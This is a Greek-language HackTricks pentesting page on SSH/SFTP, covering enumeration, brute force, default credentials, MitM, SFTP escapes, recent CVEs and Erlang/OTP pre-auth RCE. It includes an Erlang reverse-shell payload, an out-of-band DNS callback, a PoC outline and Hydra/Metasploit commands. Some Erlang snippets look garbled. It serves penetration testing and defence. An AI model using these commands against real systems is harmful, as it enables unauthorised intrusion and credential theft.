# 22 - Pentesting SSH/SFTP

{{#include ../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

**SSH (Secure Shell or Secure Socket Shell)** είναι ένα πρωτόκολλο δικτύου που επιτρέπει μια ασφαλή σύνδεση σε έναν υπολογιστή μέσω ενός μη ασφαλούς δικτύου. Είναι απαραίτητο για τη διατήρηση της εμπιστευτικότητας και της ακεραιότητας των δεδομένων κατά την πρόσβαση σε απομακρυσμένα συστήματα.

**Προεπιλεγμένη θύρα:** 22
```
22/tcp open  ssh     syn-ack
```
**SSH servers:**

- [openSSH](http://www.openssh.org) – OpenBSD SSH, περιλαμβάνεται στο BSD, σε διανομές Linux και στα Windows από τα Windows 10
- [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) – Υλοποίηση SSH για περιβάλλοντα με περιορισμένη μνήμη και πόρους επεξεργαστή, περιλαμβάνεται στο OpenWrt
- [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – Υλοποίηση SSH για Windows, ο client χρησιμοποιείται συχνά αλλά η χρήση του server είναι πιο σπάνια
- [CopSSH](https://www.itefix.net/copssh) – υλοποίηση του OpenSSH για Windows

**SSH libraries (implementing server-side):**

- [libssh](https://www.libssh.org) – Πολυπλατφορμική βιβλιοθήκη σε C που υλοποιεί το πρωτόκολλο SSHv2 με bindings σε [Python](https://github.com/ParallelSSH/ssh-python), [Perl](https://github.com/garnier-quentin/perl-libssh/) και [R](https://github.com/ropensci/ssh); χρησιμοποιείται από το KDE για sftp και από το GitHub για την git SSH υποδομή
- [wolfSSH](https://www.wolfssl.com/products/wolfssh/) – Βιβλιοθήκη server SSHv2 γραμμένη σε ANSI C και στοχευμένη σε embedded, RTOS και περιβάλλοντα με περιορισμένους πόρους
- [Apache MINA SSHD](https://mina.apache.org/sshd-project/index.html) – Η Java βιβλιοθήκη Apache SSHD βασίζεται στο Apache MINA
- [paramiko](https://github.com/paramiko/paramiko) – Python βιβλιοθήκη για το πρωτόκολλο SSHv2

## Enumeration

### Banner Grabbing
```bash
nc -vn <IP> 22
```
### Αυτοματοποιημένο ssh-audit

ssh-audit είναι ένα εργαλείο για έλεγχο της διαμόρφωσης server και client του ssh.

[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit) είναι ένα ενημερωμένο fork από [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/)

**Χαρακτηριστικά:**

- Υποστήριξη server για πρωτόκολλα SSH1 και SSH2;
- Ανάλυση διαμόρφωσης SSH client;
- Λήψη banner, αναγνώριση συσκευής ή λογισμικού και λειτουργικού συστήματος, ανίχνευση συμπίεσης;
- Συλλογή πληροφοριών για key-exchange, host-key, encryption και message authentication code algorithms;
- Εξαγωγή πληροφοριών αλγορίθμων (διαθέσιμο από, αφαιρέθηκε/απενεργοποιήθηκε, μη ασφαλής/αδύναμος/παρωχημένος, κ.ά.);
- Εξαγωγή προτάσεων για αλγόριθμους (προσθήκη ή αφαίρεση με βάση την αναγνωρισμένη έκδοση λογισμικού);
- Εξαγωγή πληροφοριών ασφάλειας (σχετικά προβλήματα, λίστα ανατεθειμένων CVE, κ.ά.);
- Ανάλυση συμβατότητας εκδόσεων SSH με βάση τις πληροφορίες αλγορίθμων;
- Ιστορικές πληροφορίες από OpenSSH, Dropbear SSH και libssh;
- Εκτελείται σε Linux και Windows;
- Χωρίς εξαρτήσεις
```bash
usage: ssh-audit.py [-1246pbcnjvlt] <host>

-1,  --ssh1             force ssh version 1 only
-2,  --ssh2             force ssh version 2 only
-4,  --ipv4             enable IPv4 (order of precedence)
-6,  --ipv6             enable IPv6 (order of precedence)
-p,  --port=<port>      port to connect
-b,  --batch            batch output
-c,  --client-audit     starts a server on port 2222 to audit client
software config (use -p to change port;
use -t to change timeout)
-n,  --no-colors        disable colors
-j,  --json             JSON output
-v,  --verbose          verbose output
-l,  --level=<level>    minimum output level (info|warn|fail)
-t,  --timeout=<secs>   timeout (in seconds) for connection and reading
(default: 5)
$ python3 ssh-audit <IP>
```
[See it in action (Asciinema)](https://asciinema.org/a/96ejZKxpbuupTK9j7h8BdClzp)

### Δημόσιο SSH key του server
```bash
ssh-keyscan -t rsa <IP> -p <PORT>
```
### Αδύναμοι Αλγόριθμοι Κρυπτογραφίας

Αυτό εντοπίζεται από προεπιλογή από το **nmap**. Μπορείτε επίσης να χρησιμοποιήσετε το **sslcan** ή το **sslyze**.

### Nmap scripts
```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```
### Shodan

- `ssh`

## Brute force usernames, passwords and private keys

### Username Enumeration

Σε ορισμένες εκδόσεις του OpenSSH μπορείτε να πραγματοποιήσετε ένα timing attack για να εντοπίσετε χρήστες. Μπορείτε να χρησιμοποιήσετε ένα metasploit module για να εκμεταλλευτείτε αυτό:
```
msf> use scanner/ssh/ssh_enumusers
```
### [Brute force](../generic-hacking/brute-force.md#ssh)

Μερικά κοινά ssh credentials [here ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)and [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) και παρακάτω.

### Private Key Brute Force

Αν γνωρίζετε μερικά ssh private keys που θα μπορούσαν να χρησιμοποιηθούν... ας το δοκιμάσουμε. Μπορείτε να χρησιμοποιήσετε το nmap script:
```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```
Ή το MSF auxiliary module:
```
msf> use scanner/ssh/ssh_identify_pubkeys
```
Ή χρησιμοποιήστε `ssh-keybrute.py` (native python3, lightweight and has legacy algorithms enabled): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).

#### Γνωστά badkeys μπορούν να βρεθούν εδώ:


{{#ref}}
https://github.com/rapid7/ssh-badkeys/tree/master/authorized
{{#endref}}

#### Weak SSH keys / Debian predictable PRNG

Μερικά συστήματα έχουν γνωστά σφάλματα στον random seed που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να έχει ως αποτέλεσμα έναν δραματικά μειωμένο keyspace που μπορεί να υποβληθεί σε bruteforced. Προ-παραχθέντα σύνολα keys που δημιουργήθηκαν σε Debian συστήματα που επηρεάστηκαν από weak PRNG είναι διαθέσιμα εδώ: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

Θα πρέπει να κοιτάξετε εδώ για να αναζητήσετε έγκυρα keys για το victim machine.

### Kerberos / GSSAPI SSO

If the target SSH server supports GSSAPI (for example Windows OpenSSH on a domain controller), you can authenticate using your Kerberos TGT instead of a password.

Workflow from a Linux attacker host:
```bash
# 1) Ensure time is in sync with the KDC to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# 2) Generate a krb5.conf for the target realm (optional, but handy)
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# 3) Obtain a TGT for the user
kinit <user>
klist

# 4) SSH with GSSAPI, using the FQDN that matches the host SPN
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```
Σημειώσεις:
- Αν συνδεθείτε με λάθος όνομα (π.χ. σύντομο host, ψευδώνυμο, ή λάθος σειρά στο `/etc/hosts`), μπορεί να λάβετε: "Server not found in Kerberos database" επειδή το SPN δεν ταιριάζει.
- `crackmapexec ssh --kerberos` μπορεί επίσης να χρησιμοποιήσει το ccache σας για Kerberos auth.

## Προεπιλεγμένα Διαπιστευτήρια

| **Προμηθευτής** | **Ονόματα Χρηστών**                                                                                               | **Κωδικοί Πρόσβασης**                                                                                                                                                                                             |
| ---------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC        | apc, device                                                                                                 | apc                                                                                                                                                                                                       |
| Brocade    | admin                                                                                                       | admin123, password, brocade, fibranne                                                                                                                                                                     |
| Cisco      | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                           | admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix     | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                            | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                      |
| D-Link     | admin, user                                                                                                 | private, admin, user                                                                                                                                                                                      |
| Dell       | root, user1, admin, vkernel, cli                                                                            | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                        |
| EMC        | admin, root, sysadmin                                                                                       | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                             |
| HP/3Com    | admin, root, vcx, app, spvar, manage, hpsupport, opc_op                                                     | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin                                                   |
| Huawei     | admin, root                                                                                                 | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                            |
| IBM        | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                              |
| Juniper    | netscreen                                                                                                   | netscreen                                                                                                                                                                                                 |
| NetApp     | admin                                                                                                       | netapp123                                                                                                                                                                                                 |
| Oracle     | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                           | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                     |
| VMware     | vi-admin, root, hqadmin, vmware, admin                                                                      | vmware, vmw@re, hqadmin, default                                                                                                                                                                          |

## SSH-MitM

Αν βρίσκεστε στο τοπικό δίκτυο και το θύμα πρόκειται να συνδεθεί στον SSH server χρησιμοποιώντας username και password, μπορείτε να προσπαθήσετε να εκτελέσετε μια MitM επίθεση για να κλέψετε αυτά τα διαπιστευτήρια:

**Διαδρομή επίθεσης:**

- **Traffic Redirection:** Ο επιτιθέμενος **στρέφει** την κίνηση του θύματος προς τη συσκευή του, παρεμποδίζοντας την προσπάθεια σύνδεσης στον SSH server.
- **Interception and Logging:** Η συσκευή του επιτιθέμενου λειτουργεί ως **proxy**, **καταγράφοντας** τα στοιχεία σύνδεσης του χρήστη προσποιούμενη ότι είναι ο νόμιμος SSH server.
- **Command Execution and Relay:** Τέλος, ο server του επιτιθέμενου **καταγράφει τα διαπιστευτήρια του χρήστη**, **προωθεί τις εντολές** στον πραγματικό SSH server, τις **εκτελεί** και **επιστρέφει τα αποτελέσματα** στον χρήστη, κάνοντας τη διαδικασία να φαίνεται ομαλή και νόμιμη.

[**SSH MITM**](https://github.com/jtesta/ssh-mitm) κάνει ακριβώς ό,τι περιγράφεται παραπάνω.

Για να πραγματοποιήσετε το πραγματικό MitM μπορείτε να χρησιμοποιήσετε τεχνικές όπως ARP spoofing, DNS spoofin ή άλλες που περιγράφονται στις [**Network Spoofing attacks**](../generic-methodologies-and-resources/pentesting-network/index.html#spoofing).

## SSH-Snake

Αν θέλετε να διασχίσετε ένα δίκτυο χρησιμοποιώντας ανακαλυφθέντα SSH private keys σε συστήματα, αξιοποιώντας κάθε ιδιωτικό κλειδί σε κάθε σύστημα για νέους hosts, τότε το [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) είναι αυτό που χρειάζεστε.

Το SSH-Snake εκτελεί αυτόματα και αναδρομικά τις ακόλουθες εργασίες:

1. Στο τρέχον σύστημα, βρίσκει τυχόν SSH private keys,
2. Στο τρέχον σύστημα, εντοπίζει hosts ή προορισμούς (user@host) στους οποίους μπορεί να γίνουν δεκτά τα private keys,
3. Προσπαθεί να κάνει SSH σε όλους τους προορισμούς χρησιμοποιώντας όλα τα private keys που βρέθηκαν,
4. Αν επιτευχθεί σύνδεση με έναν προορισμό, επαναλαμβάνει τα βήματα #1 - #4 στο σύστημα στο οποίο συνδέθηκε.

Είναι πλήρως αυτο-αναπαραγόμενο και αυτο-διασπειρόμενο — και εντελώς χωρίς αρχεία.

## Λανθασμένες Ρυθμίσεις

### Σύνδεση root

Είναι συνηθισμένο οι SSH servers να επιτρέπουν τη σύνδεση του χρήστη root από προεπιλογή, κάτι που αποτελεί σημαντικό κίνδυνο ασφαλείας. Η **απενεργοποίηση της σύνδεσης root** είναι κρίσιμο βήμα για την ασφάλεια του server. Η μη εξουσιοδοτημένη πρόσβαση με δικαιώματα διαχειριστή και οι brute force επιθέσεις μπορούν να μετριαστούν με αυτή την αλλαγή.

Για να απενεργοποιήσετε τη Σύνδεση Root σε OpenSSH:

1. **Επεξεργαστείτε το αρχείο διαμόρφωσης SSH** με: `sudoedit /etc/ssh/sshd_config`
2. **Αλλάξτε την ρύθμιση** από `#PermitRootLogin yes` σε **`PermitRootLogin no`**.
3. **Επαναφορτώστε τη διαμόρφωση** χρησιμοποιώντας: `sudo systemctl daemon-reload`
4. **Επανεκκινήστε τον SSH server** για να εφαρμοστούν οι αλλαγές: `sudo systemctl restart sshd`

### SFTP Brute Force

- [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP command execution

Υπάρχει ένα κοινό σφάλμα σε ρυθμίσεις SFTP, όπου οι διαχειριστές επιθυμούν οι χρήστες να ανταλλάσσουν αρχεία χωρίς να ενεργοποιούν το remote shell. Παρότι ορίζουν χρήστες με μη-διαδραστικά shells (π.χ. `/usr/bin/nologin`) και τους περιορίζουν σε συγκεκριμένο κατάλογο, παραμένει ένα κενό ασφαλείας. Οι **χρήστες μπορούν να παρακάμψουν αυτούς τους περιορισμούς** ζητώντας την εκτέλεση μιας εντολής (όπως `/bin/bash`) αμέσως μετά τη σύνδεση, πριν ενεργοποιηθεί το μη-διαδραστικό shell τους. Αυτό επιτρέπει μη εξουσιοδοτημένη εκτέλεση εντολών, υπονομεύοντας τα μέτρα ασφαλείας που είχαν οριστεί.

[Example from here](https://community.turgensec.com/ssh-hacking-guide/)
```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```
Εδώ είναι ένα παράδειγμα ασφαλούς διαμόρφωσης SFTP (`/etc/ssh/sshd_config` – openSSH) για τον χρήστη `noraj`:
```
Match User noraj
ChrootDirectory %h
ForceCommand internal-sftp
AllowTcpForwarding no
PermitTunnel no
X11Forwarding no
PermitTTY no
```
Αυτή η διαμόρφωση θα επιτρέψει μόνο SFTP: απενεργοποιεί την πρόσβαση στο shell εξαναγκάζοντας το start command και απενεργοποιεί την πρόσβαση TTY, αλλά επίσης απενεργοποιεί κάθε είδους port forwarding ή tunneling.

### SFTP Tunneling

Εάν έχετε πρόσβαση σε έναν SFTP server, μπορείτε επίσης να κάνετε tunneling της κίνησής σας μέσω αυτού, για παράδειγμα χρησιμοποιώντας το συνηθισμένο port forwarding:
```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```
### SFTP Symlink

Το **sftp** έχει την εντολή "**symlink**". Επομένως, αν έχεις **δικαιώματα εγγραφής** σε κάποιον φάκελο, μπορείς να δημιουργήσεις **symlinks** άλλων **φακέλων/αρχείων**. Καθώς πιθανότατα είσαι **παγιδευμένος** μέσα σε ένα chroot, αυτό **δεν θα είναι ιδιαίτερα χρήσιμο** για σένα, αλλά αν μπορείς να **προσπελάσεις** το δημιουργημένο **symlink** από μια **no-chroot** **υπηρεσία** (για παράδειγμα, αν μπορείς να προσπελάσεις το symlink από το web), θα μπορούσες να **ανοίξεις τα αρχεία που δείχνει το symlink μέσω του web**.

Για παράδειγμα, για να δημιουργήσεις ένα **symlink** από ένα νέο αρχείο **"**_**froot**_**" προς "**_**/**_**"**:
```bash
sftp> symlink / froot
```
Αν μπορείς να αποκτήσεις πρόσβαση στο αρχείο "_froot_" μέσω web, θα μπορέσεις να εμφανίσεις τα περιεχόμενα του φακέλου root ("/") του συστήματος.

### Μέθοδοι αυθεντικοποίησης

Σε περιβάλλον υψηλής ασφάλειας είναι σύνηθες να ενεργοποιείται μόνο key-based ή two factor authentication αντί της απλής password-based authentication. Αλλά συχνά οι ισχυρότερες μέθοδοι ασφαλείας ενεργοποιούνται χωρίς να απενεργοποιηθούν οι ασθενέστερες. Συχνή περίπτωση είναι η ενεργοποίηση του `publickey` στην openSSH διαμόρφωση και η ρύθμισή του ως μέθοδος προεπιλογής χωρίς να απενεργοποιηθεί το `password`. Έτσι, χρησιμοποιώντας το verbose mode του SSH client, ένας επιτιθέμενος μπορεί να δει ότι μια ασθενέστερη μέθοδος είναι ενεργοποιημένη:
```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```
Για παράδειγμα, αν έχει τεθεί όριο αποτυχιών πιστοποίησης και δεν έχετε ποτέ την ευκαιρία να φτάσετε στη μέθοδο password, μπορείτε να χρησιμοποιήσετε την επιλογή `PreferredAuthentications` για να επιβάλλετε τη χρήση αυτής της μεθόδου.
```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```
Η ανασκόπηση της διαμόρφωσης του SSH server είναι απαραίτητη για να ελεγχθεί ότι μόνο οι αναμενόμενες μέθοδοι επιτρέπονται. Η χρήση του verbose mode στον client μπορεί να βοηθήσει να αξιολογηθεί η αποτελεσματικότητα της διαμόρφωσης.

### Αρχεία διαμόρφωσης
```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
## Fuzzing

- [https://packetstormsecurity.com/files/download/71252/sshfuzz.txt](https://packetstormsecurity.com/files/download/71252/sshfuzz.txt)
- [https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)

## Πρόσφατες Κρίσιμες Ευπάθειες (2024)

### CVE-2024-6387 – regreSSHion signal-handler race

OpenSSH 8.5p1–9.7p1 αφαίρεσε το async-safe logging guard μέσα στον `SIGALRM` handler του `sshd`, επανεισήγαγε την CVE-2006-5051 και επέτρεψε σε μη-επιβεβαιωμένους attackers να διαφθείρουν το glibc heap αμέσως μόλις λήξει το `LoginGraceTime`. Η Qualys weaponized το bug για root RCE σε 32-bit Linux και σημείωσε ότι οι 64-bit στόχοι παραμένουν brute-forceable με αρκετές προσπάθειες grooming, οπότε δώστε προτεραιότητα σε hosts που εξακολουθούν να αποκαλύπτουν αυτές τις εκδόσεις κατά τα banner grabs.

Η εκμετάλλευση βασίζεται στον χρονισμό: βομβαρδίστε τον daemon με half-open sessions που ποτέ δεν authenticate ώστε ο privileged monitor να χτυπάει επανειλημμένα το ευάλωτο signal path ενώ εσείς διαμορφώνετε το allocator state.

Συμβουλές χειριστών:

- Fingerprint builds με `ssh -V` (remote banner) ή `ssh -G <target> | grep ^userauths` και επιβεβαιώστε ότι το `LoginGraceTime` είναι μη-μηδενικό.
- Pressure-test έναν εργαστηριακό στόχο στέλνοντας spam από σύντομες συνεδρίες που δεν ζητούν authentication, για παράδειγμα:
```bash
parallel -j200 "timeout 3 ssh -o PreferredAuthentications=none -o ConnectTimeout=2 attacker@${TARGET}" ::: {1..4000}
```
- Hosts που επιβάλλουν `LoginGraceTime 0` δεν περνάνε ποτέ από τον buggy code path — περιμένετε μόνο DoS δυνατότητα μέσω εξάντλησης του `MaxStartups`.

### CVE-2024-3094 – xz/liblzma supply-chain backdoor

XZ Utils 5.6.0 και 5.6.1 shipped trojanized release tarballs των οποίων τα build scripts αποσυμπιέζουν ένα κρυφό object κατά το Debian/RPM packaging σε x86-64 Linux. Το payload καταχράται τον glibc `IFUNC` resolver για να hook-άρει το `RSA_public_decrypt` στο `sshd` (όταν systemd patches αναγκάζουν το liblzma να φορτωθεί) και αποδέχεται attacker-signed πακέτα για pre-auth code execution.

Επειδή η κακόβουλη λογική υπάρχει μόνο μέσα σε αυτά τα packaged binaries, η offensive validation πρέπει να ελέγξει τι έχει πραγματικά εγκαταστήσει το θύμα: ελέγξτε `xz --version`, `rpm -qi xz`/`dpkg -l xz-utils`, συγκρίνετε τα hashes του `/usr/lib*/liblzma.so*`, και επιθεωρήστε `ldd /usr/sbin/sshd | grep -E "systemd|lzma"` για να δείτε εάν το `sshd` τραβάει την συμβιβασμένη εξάρτηση. Το hook παραμένει ανενεργό εκτός αν το process path είναι `/usr/sbin/sshd`, οπότε η αναπαραγωγή του περιβάλλοντος build της distro συχνά απαιτείται για να αναπαραχθεί το backdoor σε lab.

## Authentication State-Machine Bypass (Pre-Auth RCE)

Several SSH server implementations contain logic flaws in the **authentication finite-state machine** that allow a client to send *connection-protocol* messages **before** authentication has finished.  Because the server fails to verify that it is in the correct state, those messages are handled as if the user were fully authenticated, leading to **unauthenticated code execution** or session creation.

Σε πρωτοκολλικό επίπεδο, οποιοδήποτε SSH μήνυμα με _message code_ **≥ 80** (0x50) ανήκει στο *connection* layer (RFC 4254) και πρέπει να **γίνεται αποδεκτό μόνο μετά από επιτυχή authentication** (RFC 4252). Αν ο server επεξεργαστεί ένα από αυτά τα μηνύματα ενώ βρίσκεται ακόμα στην κατάσταση *SSH_AUTHENTICATION*, ο attacker μπορεί άμεσα να δημιουργήσει ένα channel και να ζητήσει ενέργειες όπως command execution, port-forwarding, κ.λπ.

### Generic Exploitation Steps
1. Establish a TCP connection to the target’s SSH port (commonly 22, but other services may expose Erlang/OTP on 2022, 830, 2222…).
2. Craft a raw SSH packet:
* 4-byte **packet_length** (big-endian)
* 1-byte **message_code** ≥ 80 (e.g. `SSH_MSG_CHANNEL_OPEN` = 90, `SSH_MSG_CHANNEL_REQUEST` = 98)
* Payload that will be understood by the chosen message type
3. Send the packet(s) **before completing any authentication step**.
4. Interact with the server APIs that are now exposed _pre-auth_ (command execution, port forwarding, file-system access, …).

Python proof-of-concept outline:
```python
import socket, struct
HOST, PORT = '10.10.10.10', 22
s = socket.create_connection((HOST, PORT))
# skip version exchange for brevity – send your own client banner then read server banner
# … key exchange can be skipped on vulnerable Erlang/OTP because the bug is hit immediately after the banner
# Packet: len(1)=1, SSH_MSG_CHANNEL_OPEN (90)
pkt  = struct.pack('>I', 1) + b'\x5a'  # 0x5a = 90
s.sendall(pkt)
# additional CHANNEL_REQUEST packets can follow to run commands
```
Στην πράξη θα χρειαστεί να πραγματοποιήσετε (ή να παραλείψετε) την ανταλλαγή κλειδιών σύμφωνα με την υλοποίηση-στόχο, αλλά **no authentication** γίνεται ποτέ πραγματοποιείται.

---
### Erlang/OTP `sshd` (CVE-2025-32433)
* **Affected versions:** OTP < 27.3.3, 26.2.5.11, 25.3.2.20
* **Root cause:** ο εγγενής SSH daemon του Erlang δεν επαληθεύει την τρέχουσα κατάσταση πριν καλέσει `ssh_connection:handle_msg/2`. Επομένως οποιοδήποτε πακέτο με κωδικό μηνύματος 80-255 φτάνει στον connection handler ενώ η συνεδρία βρίσκεται ακόμα στην κατάσταση *userauth*.
* **Impact:** χωρίς authentication **remote code execution** (ο daemon συνήθως τρέχει ως **root** σε embedded/OT συσκευές).

Παράδειγμα payload που ανοίγει ένα reverse shell δεμένο στο κανάλι που ελέγχεται από τον επιτιθέμενο:
```erlang
% open a channel first … then:
execSinet:cmd(Channel, "exec('/bin/sh', ['-i'], [{fd, Channel#channel.fd}, {pid, true}]).").
```
Blind RCE / out-of-band detection μπορεί να πραγματοποιηθεί μέσω DNS:
```erlang
execSinet:gethostbyname("<random>.dns.outbound.watchtowr.com").Zsession
```
Εντοπισμός & Αντιμετώπιση:
* Ελέγξτε την κυκλοφορία SSH: **απορρίψτε οποιοδήποτε πακέτο με κωδικό μηνύματος ≥ 80 που παρατηρείται πριν την αυθεντικοποίηση**.
* Αναβαθμίστε το Erlang/OTP σε **27.3.3 / 26.2.5.11 / 25.3.2.20** ή νεότερο.
* Περιορίστε την έκθεση των θυρών διαχείρισης (22/2022/830/2222) – ειδικά σε εξοπλισμό OT.

---
### Άλλες υλοποιήσεις που επηρεάζονται
* **libssh** 0.6 – 0.8 (server side) – **CVE-2018-10933** – δέχεται ένα μη αυθεντικοποιημένο `SSH_MSG_USERAUTH_SUCCESS` που αποστέλλεται από τον client, ουσιαστικά το αντίστροφο σφάλμα λογικής.

Το κοινό μάθημα είναι ότι οποιαδήποτε απόκλιση από τις μεταβάσεις κατάστασης που επιβάλλονται από το RFC μπορεί να είναι μοιραία· όταν ανασκοπείτε ή κάνετε fuzzing τους SSH daemons, δώστε ιδιαίτερη προσοχή στην *state-machine enforcement*.



## Αναφορές

- [Unit 42 – Erlang/OTP SSH CVE-2025-32433](https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/)
- [SSH hardening guides](https://www.ssh-audit.com/hardening_guides.html)
- [Turgensec SSH hacking guide](https://community.turgensec.com/ssh-hacking-guide)
- [Pentesting Kerberos (88) – client setup and troubleshooting](pentesting-kerberos-88/README.md)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [Qualys – regreSSHion remote unauthenticated code execution in OpenSSH server](https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server)
- [Snyk – The XZ backdoor (CVE-2024-3094)](https://snyk.io/blog/the-xz-backdoor-cve-2024-3094/)

## HackTricks Αυτόματες Εντολές
```
Protocol_Name: SSH
Port_Number: 22
Protocol_Description: Secure Shell Hardening

Entry_1:
Name: Hydra Brute Force
Description: Need Username
Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh

Entry_2:
Name: consolesless mfs enumeration
Description: SSH enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'

```
{{#include ../banners/hacktricks-training.md}}
